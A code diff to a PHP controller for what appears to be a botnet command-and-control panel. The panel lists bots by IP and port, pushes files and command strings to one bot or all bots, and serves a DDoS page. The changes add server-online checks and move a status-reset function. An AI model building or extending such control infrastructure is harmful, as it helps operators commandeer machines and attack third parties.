@@ -1,13 +1,22 @@
 <?php
 include_once("../Model/Bean/Bot.php");
 include_once("../Model/BO/BO_Bot.php");
+include_once("../utils/checkServerOn.php");
 class C_Bot
 {
-
-    //Nhân viên: Xem, tìm kiếm, thêm, xóa
+    public function resetBotStatus()
+    {
+        $boBot = new BO_Bot();
+        if (isset($_REQUEST['ID'])) {
+            $boBot->resetBotStatusWithId($_REQUEST['ID']);
+        } else {
+            $boBot->resetBotStatus();
+        }
+    }
     public function view()
     {
         session_start();
+        checkSocket();
         if (isset($_SESSION['login']) && $_SESSION['login'] == true) {
             $boBot = new BO_Bot();
             if (!isset($_REQUEST["page"]) || $_REQUEST["page"] == 0) {
@@ -18,6 +27,8 @@ class C_Bot
             $count = $boBot->getCountAllBot();
             $_SESSION['header_display'] = "All Bot";
             include_once("../View/listBot.php");
+
+
         } else {
             include_once('../View/noLogin.php');
         }
@@ -25,6 +36,7 @@ class C_Bot
     public function getBotActive()
     {
         session_start();
+        checkSocket();
         if (isset($_SESSION['login']) && $_SESSION['login'] == true) {
             $boBot = new BO_Bot();
             if (!isset($_REQUEST["page"]) || $_REQUEST["page"] == 0) {
@@ -42,6 +54,7 @@ class C_Bot
     public function getBotPassive()
     {
         session_start();
+        checkSocket();
         if (isset($_SESSION['login']) && $_SESSION['login'] == true) {
             $boBot = new BO_Bot();
             if(!isset($_REQUEST["page"])|| $_REQUEST["page"] ==0)
@@ -62,6 +75,7 @@ class C_Bot
     public function putFileOneBot()
     {
         session_start();
+        checkSocket();
         if (isset($_SESSION['login']) && $_SESSION['login'] == true) {
             $ID =  $_REQUEST['ID'];
             $boBot = new BO_Bot();
@@ -75,6 +89,7 @@ class C_Bot
     public function controlBot()
     {
         session_start();
+        checkSocket();
         if (isset($_SESSION['login']) && $_SESSION['login'] == true) {
             $cmdstr = $_REQUEST["cmdstr"];
             $function = $_REQUEST["function"];
@@ -120,13 +135,22 @@ class C_Bot
     public function putFileAllBot()
     {
         session_start();
+        checkSocket();
         if (isset($_SESSION['login']) && $_SESSION['login'] == true) {
-            //$ID =  $_REQUEST['ID'];
-            $boBot = new BO_Bot();
-            $boBot->controlAllBot();
-            //$bot = $boBot->getBotDetail($ID);
-            $bot = new Bot("All", "All", "All", 1, 0);
-            include_once('../View/openBot.php');
+            if(isset($_SESSION['serverStatus']) && $_SESSION['serverStatus'] == "online")
+            {
+                //$ID =  $_REQUEST['ID'];
+                $boBot = new BO_Bot();
+                $boBot->controlAllBot();
+                //$bot = $boBot->getBotDetail($ID);
+                $bot = new Bot("All", "All", "All", 1, 0);
+                include_once('../View/openBot.php');
+            }
+            else
+            {
+                include_once('../View/noServer.php');
+            }
+           
         } else {
             include_once('../View/noLogin.php');
         }
@@ -138,15 +162,7 @@ class C_Bot
         $boBot = new BO_Bot();
         $boBot->addBot($ip, $port);
     }
-    public function resetBotStatus()
-    {
-        $boBot = new BO_Bot();
-        if (isset($_REQUEST['ID'])) {
-            $boBot->resetBotStatusWithId($_REQUEST['ID']);
-        } else {
-            $boBot->resetBotStatus();
-        }
-    }
+  
     public function resetCommandBot()
     {
         $fp = fopen('../txt/commandBot.txt', 'w');
@@ -168,11 +184,13 @@ class C_Bot
         session_start();
         $header_display = isset($_SESSION['header_display']) ? $_SESSION['header_display'] : '';
         $listBot = $boBot->getAllBot();
+        $count = $boBot->getCountAllBot();
         include_once("../View/listBot.php");
     }
     public function viewDDOS()
     {
         session_start();
+        checkSocket();
         if (isset($_SESSION['login']) && $_SESSION['login'] == true) {
             include_once("../View/ddos.php");
         } else {
